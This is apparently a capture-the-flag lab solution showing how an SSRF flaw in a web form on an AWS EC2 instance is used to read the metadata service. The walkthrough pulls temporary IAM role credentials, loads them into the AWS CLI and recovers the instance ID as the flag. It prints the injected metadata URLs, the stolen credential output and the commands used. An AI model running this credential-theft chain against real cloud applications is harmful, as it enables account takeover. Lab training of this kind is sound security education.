# 🛠️ Lab <NN> — EC2 Compromise (Solution)

> This lab demonstrates exploitation of an **SSRF vulnerability** in a web application hosted on an AWS EC2 instance. By abusing the instance metadata service (IMDS), we extract temporary credentials and identify the EC2 instance ID hosting the application.

---

## 🔎 Environment & Context
- **Domain:** Cloud Security  
- **Provider:** AWS  
- **Target / Service:** EC2 instance hosting a web application  
- **Attacker Privilege:** Unauthenticated web user with SSRF access to IMDS (169.254.169.254)

---

## 🎯 Objective
Identify and extract:  
**“The Instance ID of the EC2 VM running the web application.”**

---

## 🧭 Pre-requisites
- Tools:  
  - `awscli`  
  - `curl` (Linux) or browser-based exploitation  
  - Windows Command Prompt
- Folder: `./screenshots/` for storing evidence  
- Optional placeholder for Git tracking:  

> **Tip:** create an empty screenshots folder with `.gitkeep` so Git tracks it:
> `screenshots/.gitkeep`

---
# ⚙️ Step-by-Step Solution

## **1️⃣ Initial Access**
You are provided with a web URL running on an EC2 instance:
http://MACHINE-IP/index.html

![Step 3 Screenshot](./screenshots/1.png)

Open it in a browser → click **Book Free Demo** → reach the vulnerable form.

---

## **2️⃣ SSRF Injection – Accessing Instance Metadata**
In the **Company Name** field, inject: "http://169.254.169.254/latest/meta-data/"

then enter all other details and then click on submit 


Submit the form.

![Step 2 Screenshot](./screenshots/2.png)

then u will be getting an output :

Thank you for your submission ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hibernation/ hostname iam/ identity-credentials/ instance-action instance-id instance-life-cycle instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/ system!

This confirms **SSRF → IMDSv1** exploitation.

---

## **3️⃣ Extract IAM Role Temporary Credentials**
Next, fetch AWS temporary credentials:

Submit the form again.

the next injection is in the same form page instead of the old url keep this new url where you will be getting the credentials 
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role

![Step 3 Screenshot](./screenshots/3.png)

You will recieve this o/p :

Thank you for your submission { "Code" : "Success", "LastUpdated" : "2025-12-05T06:37:30Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIAQ3EGUZMESEE42QJV", "SecretAccessKey" : "COEl580OWIOjrHs2BxG7pdlULPBP/WEenfgRNxln", "Token" : "IQoJb3JpZ2luX2VjEI///////////{token_here}", "Expiration" : "2025-12-05T13:04:17Z" }!

then now open your command prompt in your windows and if you dosent have awscli download it

## **4️⃣ Configure AWS CLI With Retrieved Keys**

enter this commands in the command prompt 
```json
SET AWS_ACCESS_KEY_ID=ASIAQ3EGUZMEYJB4ZCYA
SET AWS_SECRET_ACCESS_KEY=0Xgeq3SkhcFo+xYPtXXRPPt+XDkBXq1bQY8lIbw8
SET AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEI7////////// {token_here}
```
## **5️⃣ Identify the EC2 Instance (Flag Extraction)**
then write this command : aws sts get-caller-identity

then the o/p will be in json format 

format :
```json
{
    "UserId": "AROAQ3EGUZME43VU3F34W:i-092dea896856b986e",
    "Account": "058264439561",
    "Arn": "arn:aws:sts::058264439561:assumed-role/ec2-prod-role/i-092dea896856b986e"
}
```

the flag is i-092dea896856b986e
